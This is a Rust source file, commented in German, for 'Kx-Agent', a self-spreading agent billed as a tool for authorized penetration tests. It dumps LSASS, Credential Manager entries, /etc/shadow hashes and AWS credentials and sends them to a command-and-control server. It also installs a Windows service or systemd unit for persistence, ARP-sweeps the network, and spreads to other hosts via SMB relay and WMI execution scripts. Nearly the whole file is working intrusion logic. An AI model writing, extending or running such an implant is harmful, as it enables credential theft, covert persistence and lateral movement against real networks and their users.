//! Kx-Agent: Autonomer Propagations-Orchestrator für autorisierte Penetrationstests.
//!
//! Entdeckt Hosts im Netz, scannt offene Ports, versucht Exploits, extrahiert
//! Secrets vom lokalen Host, installiert Persistenz und meldet alles an den
//! C2-Server. Nur für autorisierte Netzwerke gedacht.

mod c2;
mod propagate;

use std::net::Ipv4Addr;

use clap::Parser;
use tracing::{error, info};

/// Agent-Konfiguration aus CLI/Umgebung.
#[derive(Parser, Debug)]
#[command(name = "kx-agent", about = "Kx-autonomer Agent")]
struct Args {
    /// URL des C2-Servers (https://host:port).
    #[arg(long, env = "KX_C2_URL")]
    server: String,
    /// Bearer-Token für den C2-Server.
    #[arg(long, env = "KX_C2_TOKEN")]
    token: String,
    /// Netzwerkschnittstelle für den ARP-Sweep.
    #[arg(long, default_value = "eth0")]
    iface: String,
    /// Start-IP des Scan-Bereichs.
    #[arg(long)]
    start: String,
    /// End-IP des Scan-Bereichs.
    #[arg(long)]
    end: String,
    /// Eigene IP für ARP-Anfragen.
    #[arg(long, default_value = "192.168.1.100")]
    own_ip: String,
    /// Vorkonfigurierte Host-Liste (kommagetrennt) — umgeht ARP.
    #[arg(long)]
    hosts: Option<String>,
    /// Pfad zu smbrelayx.py.
    #[arg(long, default_value = "smbrelayx.py")]
    relay_script: String,
    /// Pfad zu wmiexec.py.
    #[arg(long, default_value = "wmiexec.py")]
    wmi_script: String,
    /// Pfad zum selbstsignierten Server-Zertifikat (PEM).
    #[arg(long)]
    server_cert: String,
}

/// Lokale Host-ID (MAC-basiert, stabil pro Maschine).
fn local_host_id() -> String {
    // Einfache heuristik: Interface-Name + PID als Platzhalter für echte MAC.
    // In der Praxis: MAC des primären Interfaces lesen.
    format!("host-{}", std::process::id())
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "info".into()),
        )
        .init();

    let args = Args::parse();
    info!("Kx-Agent startete, C2={}", args.server);

    let host_id = local_host_id();
    let client = match c2::C2Client::new(&args.server, &args.token, &args.server_cert) {
        Ok(c) => c,
        Err(e) => {
            error!("C2-Client-Initialisierung fehlgeschlagen: {e}");
            std::process::exit(1);
        }
    };

    // 1. Lokale Secrets extrahieren (je nach Plattform).
    let local_secrets = collect_local_secrets().await;
    for s in &local_secrets {
        if let Err(e) = client.upload_secret(&host_id, s).await {
            error!("Secret-Upload fehlgeschlagen: {e}");
        }
    }
    info!("{} lokale Secrets extrahiert und hochgeladen", local_secrets.len());

    // 2. Persistenz installieren.
    if let Err(e) = install_persistence().await {
        error!("Persistenz-Installation fehlgeschlagen: {e}");
    } else {
        info!("Persistenz installiert");
    }

    // 3. Netzwerk-Phase: Entdeckung → Scan → Exploit.
    let range_start: Ipv4Addr = args.start.parse().expect("Ungültige Start-IP");
    let range_end: Ipv4Addr = args.end.parse().expect("Ungültige End-IP");
    let own_ip: Ipv4Addr = args.own_ip.parse().expect("Ungültige eigene IP");
    let own_mac = [0x00; 6]; // Platzhalter — in der Praxis vom System lesen.

    let discovered = if let Some(hosts) = &args.hosts {
        info!("Nutze vorgegebene Host-Liste");
        hosts
            .split(',')
            .filter_map(|h| h.trim().parse::<Ipv4Addr>().ok())
            .map(|ip| kx_scanner::DiscoveredHost {
                mac: [0; 6],
                ip: ip.into(),
            })
            .collect()
    } else {
        match kx_scanner::arp_sweep(&args.iface, &range_start, &range_end, &own_ip, &own_mac) {
            Ok(h) => h,
            Err(e) => {
                error!("ARP-Sweep fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        }
    };

    let results = propagate::run_propagation(
        &discovered,
        &args.relay_script,
        &args.wmi_script,
        &local_ip(),
    )
    .await;

    // 4. Neuentdeckte Hosts an den C2-Server melden.
    for h in &results.new_hosts {
        let _ = client.register_host(&h).await;
    }
    for s in &results.new_secrets {
        let _ = client.upload_secret(&results.source_host, s).await;
    }

    info!(
        "Agent-Lauf abgeschlossen: {} neue Hosts, {} neue Secrets",
        results.new_hosts.len(),
        results.new_secrets.len()
    );
}

/// Extrahiert Secrets vom lokalen Host (Windows oder POSIX).
async fn collect_local_secrets() -> Vec<c2::SecretPayload> {
    let mut out = Vec::new();
    #[cfg(target_os = "windows")]
    {
        for secret in kx_win::extract_lsass().await.unwrap_or_default() {
            out.push(c2::SecretPayload {
                cred_type: secret.secret_type,
                username: secret.target,
                password: secret.value,
                source: "lsass".into(),
            });
        }
        for secret in kx_win::extract_credential_manager().await.unwrap_or_default() {
            out.push(c2::SecretPayload {
                cred_type: "credential_manager".into(),
                username: secret.target,
                password: secret.value,
                source: "cmdkey".into(),
            });
        }
    }
    #[cfg(unix)]
    {
        for secret in kx_posix::extract_shadow_hashes().await.unwrap_or_default() {
            out.push(c2::SecretPayload {
                cred_type: "shadow".into(),
                username: secret.target,
                password: secret.value,
                source: "/etc/shadow".into(),
            });
        }
        for secret in kx_posix::extract_aws_credentials().await.unwrap_or_default() {
            out.push(c2::SecretPayload {
                cred_type: "aws".into(),
                username: secret.target,
                password: secret.value,
                source: "~/.aws/credentials".into(),
            });
        }
    }
    out
}

/// Installiert Persistenz (Windows oder POSIX).
///
/// Der vollständige Startbefehl (Binary + alle aktuellen CLI-Argumente) wird
/// in der Dienstdefinition gespeichert, damit der Agent nach einem Reboot mit
/// identischen Parametern neu startet und nicht in eine Crashloop gerät.
async fn install_persistence() -> Result<(), Box<dyn std::error::Error>> {
    let exe = std::env::current_exe()?;
    let args = build_persistence_args();
    #[cfg(target_os = "windows")]
    {
        kx_win::install_service("kx-agent", &exe, "Kx Agent").await?;
        kx_win::start_service("kx-agent").await?;
    }
    #[cfg(unix)]
    {
        kx_posix::install_systemd_service("kx-agent", &exe, &args).await?;
    }
    Ok(())
}

/// Baut die shell-sicheren Startargumente (ohne Binary-Pfad) aus den
/// aktuellen CLI-Args. Die systemd-Unit hängt diese an den Binary-Pfad an.
fn build_persistence_args() -> String {
    std::env::args()
        .skip(1)
        .map(|a| escape_arg(&a))
        .collect::<Vec<_>>()
        .join(" ")
}

/// Zitiert ein Argument, um Shell-Injection über Argumente zu verhindern.
fn escape_arg(arg: &str) -> String {
    format!("'{}'", arg.replace('\'', "'\\''"))
}

/// Ermittelt die lokale IP-Adresse, indem ein UDP-Socket ohne Datenversand
/// mit einer externen Adresse „verbindet" (Standard-Technik).
fn local_ip() -> String {
    use std::net::UdpSocket;
    UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| {
            s.connect("8.8.8.8:80")?;
            s.local_addr()
        })
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|_| "127.0.0.1".to_string())
}
